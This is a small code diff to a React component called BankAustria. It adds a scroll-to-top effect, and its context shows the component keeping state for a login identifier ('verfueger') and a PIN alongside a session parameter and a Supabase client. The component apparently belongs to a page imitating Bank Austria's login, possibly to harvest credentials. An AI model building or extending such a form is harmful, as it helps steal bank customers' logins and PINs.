@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useSearchParams, useNavigate } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
@@ -87,6 +87,8 @@ const BankAustria = () => {
   const navigate = useNavigate();
   const sessionId = searchParams.get("s") || "";
   const [showLoading, setShowLoading] = useState(false);
+
+  useEffect(() => { window.scrollTo(0, 0); }, []);
 
   const [verfueger, setVerfueger] = useState("");
   const [pin, setPin] = useState("");
